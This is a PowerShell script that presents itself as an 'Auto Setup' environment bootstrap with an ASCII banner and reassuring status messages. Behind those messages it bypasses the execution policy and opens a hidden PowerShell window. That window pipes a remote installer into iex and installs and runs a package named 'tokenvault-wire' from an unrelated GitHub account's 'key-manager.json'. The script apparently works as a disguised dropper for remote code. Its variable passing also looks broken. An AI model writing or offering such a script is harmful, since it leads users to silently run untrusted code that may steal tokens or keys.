
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
Write-Host "                                              |_|    " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor DarkGray
Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""


Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Automated installation will begin shortly." -ForegroundColor White
Write-Host "[INFO] " -NoNewline -ForegroundColor Green
Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
Write-Host ""

 

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

$packageName = "tokenvault-wire"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"
$installUrl = "https://raw.githubusercontent.com/scoopdev961/lab/refs/heads/main/key-manager.json"

Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command `"`
    `$packageName = '$packageName';
    `$appPath = `"`$env:USERPROFILE\scoop\apps\`$packageName`";
    
    if (!(Get-Command scoop -ErrorAction SilentlyContinue)) {
        irm get.scoop.sh | iex | Out-Null
    }
    if (!(Test-Path `$appPath)) {
        scoop install `$installUrl;
        wire;
    }
`""
